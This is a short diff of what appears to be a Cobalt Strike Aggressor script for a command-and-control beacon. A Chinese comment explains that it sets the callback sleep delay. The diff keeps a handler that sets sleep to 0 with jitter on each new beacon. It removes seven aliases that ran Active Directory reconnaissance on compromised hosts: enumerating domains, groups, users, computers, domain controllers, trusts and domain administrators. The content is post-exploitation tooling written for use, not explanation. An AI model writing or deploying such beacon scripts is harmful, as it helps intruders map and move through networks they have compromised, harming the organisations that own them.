@@ -1,39 +1,6 @@
 # CS回连的时候开始设置延时设置
+
+
 on beacon_initial {
 	bsleep($1 , 0 , 30);
-}
-beacon_command_register("Get-Domain", "Get-Domain info");
-beacon_command_register("Get-DomainGroup", "Get-DomainGroup info");
-beacon_command_register("Get-DomainUser", "Get-DomainUser info");
-beacon_command_register("Get-DomainADUser", "Get-DomainADUser info");
-beacon_command_register("Get-DomainComputer", "Get-DomainComputer info");
-beacon_command_register("Get-Domain_trusts", "Get-Domain_trusts info");
-beacon_command_register("Get-DomainControllers", "Get-DomainControllers info");
-alias Get-Domain
-{
-	bshell($1, "net view /domain");
-}
-alias Get-DomainGroup
-{
-	bshell($1, "net group /domain");
-}
-alias Get-DomainComputer
-{
-	bshell($1, "net group \"domain computers\" /domain");
-}
-alias Get-Domain_trusts
-{
-	bshell($1, "nltest /domain_trusts");
-}
-alias Get-DomainControllers
-{
-	bshell($1, "net group \"Domain Controllers\" /domain");
-}
-alias Get-DomainUser
-{
-	bshell($1, "net user /domain");
-}
-alias Get-DomainADUser
-{
-	bshell($1, "net localgroup administrators /domain");
 }
